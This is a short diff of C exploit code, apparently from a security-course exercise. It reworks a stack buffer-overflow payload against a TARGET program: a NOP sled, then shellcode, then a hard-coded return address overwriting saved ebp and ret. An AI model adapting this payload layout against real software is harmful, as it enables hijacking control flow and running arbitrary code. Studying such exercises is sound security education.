@@ -11,11 +11,13 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  char attack[248];
+  const int size = 240 + 4 + 4; // buf size + ebp + ret
+  char attack[size];
+  memset(attack, 0x90, size);
+
   char ret[] = "\xb8\xfc\xff\xbf";
-  memset(attack, 0x90, 199);
-  memcpy(attack + 199, shellcode, 45);
-  memcpy(attack + 244, ret, 4);
+  memcpy(attack + (size - 49), shellcode, 45);
+  memcpy(attack + (size - 4), ret, 4);
  
   args[0] = TARGET; args[1] = attack; args[2] = NULL;
   env[0] = NULL;
